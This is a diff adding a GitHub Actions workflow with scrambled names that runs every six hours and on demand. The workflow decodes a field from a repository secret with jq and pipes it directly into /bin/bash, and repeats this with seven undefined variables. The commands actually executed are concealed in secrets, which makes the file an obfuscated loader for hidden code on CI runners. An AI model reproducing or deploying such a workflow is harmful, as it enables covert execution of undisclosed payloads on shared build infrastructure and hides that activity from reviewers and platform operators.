@@ -1,0 +1,24 @@
+name: taoshaye7618
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taoshaye7618
+        env:
+          pv2338: ${{ secrets.pv2338 }}
+        run: |
+          echo $pv2338 | jq -r .zk4 | /bin/bash
+          echo $jqnk308 | jq -r .hoxc00046 | /bin/bash
+          echo $k3 | jq -r .kfbh463 | /bin/bash
+          echo $wyumm39332 | jq -r .hqi54 | /bin/bash
+          echo $azrge3531 | jq -r .fxw1 | /bin/bash
+          echo $ehhq6 | jq -r .xpgoj8 | /bin/bash
+          echo $if9865 | jq -r .vmw31 | /bin/bash
+          echo $g94707 | jq -r .ndy92215 | /bin/bash
+
